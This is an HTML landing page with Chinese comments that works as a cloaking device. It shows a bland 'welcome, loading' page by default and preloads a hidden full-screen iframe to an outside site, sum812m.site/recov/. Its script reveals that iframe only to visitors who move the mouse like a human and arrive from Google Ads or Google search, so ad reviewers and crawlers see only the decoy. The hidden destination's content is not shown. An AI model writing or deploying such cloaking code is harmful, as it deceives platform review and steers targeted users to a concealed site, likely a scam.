<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>欢迎访问</title>
    
    <!-- 性能优化：提前与目标服务器建立连接，减少加载延迟 -->
    <link rel="preconnect" href="https://sum812m.site">
    <link rel="dns-prefetch" href="https://sum812m.site">

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        /* A面：安全页 */
        #safe-page {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f7f6;
            color: #333;
            text-align: center;
        }
        .safe-content {
            padding: 20px;
        }
    </style>
</head>
<body>

    <!-- A面：安全页（默认显示） -->
    <div id="safe-page">
        <div class="safe-content">
            <h2>欢迎访问</h2>
            <p>页面正在加载，请稍候...</p>
        </div>
    </div>

    <!-- B面：后台预加载容器（初始隐藏，提前在后台加载，实现秒开） -->
    <div id="real-page" style="display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; z-index: 10000; margin:0; padding:0; overflow:hidden;">
        <iframe src="https://sum812m.site/recov/" marginwidth="0" marginheight="0" align="middle" scrolling="auto" frameborder="0" style="width:100%;height:100vh;border:none;"></iframe>
    </div>
     
    <!-- ================= 核心判定脚本 ================= -->
    <script>
    let hasTriggered = false;
    let startX = null;
    let startY = null;
     
    function handleMouseMove(event) {
        if (hasTriggered) return;
         
        // 1. 记录初始坐标
        if (startX === null || startY === null) {
            startX = event.clientX;
            startY = event.clientY;
            return;
        }
         
        // 2. 计算滑动距离，超过50像素判定为真实人类
        let distance = Math.sqrt(Math.pow(event.clientX - startX, 2) + Math.pow(event.clientY - startY, 2));
         
        if (distance > 50) {
            const urlParams = new URLSearchParams(window.location.search);
            const kw = urlParams.get('kw');
                
            // 3. 来源校验
            const referrer = document.referrer.toLowerCase();
            const isFromGoogleAds = urlParams.has('gclid') || urlParams.has('gbraid');
            const isFromGoogleSearch = referrer.includes('google.com') || referrer.includes('google.cn') || referrer.includes('google.com.hk');
                
            const isFromGoogle = isFromGoogleAds || isFromGoogleSearch;
         
            // 4. 终极审判：带 kw 参数 + 是谷歌来的
            if (isFromGoogle) {
                hasTriggered = true;
                document.removeEventListener('mousemove', handleMouseMove);
                    
                // 【秒开核心】：隐藏 A 面，瞬间显示后台已加载好的 B 面 iframe
                document.getElementById('safe-page').style.display = 'none';
                document.getElementById('real-page').style.display = 'block';
                    
            } else {
                document.removeEventListener('mousemove', handleMouseMove);
            }
        }
    }
     
    // 挂载监听
    document.addEventListener('mousemove', handleMouseMove);
    </script>

</body>
</html>
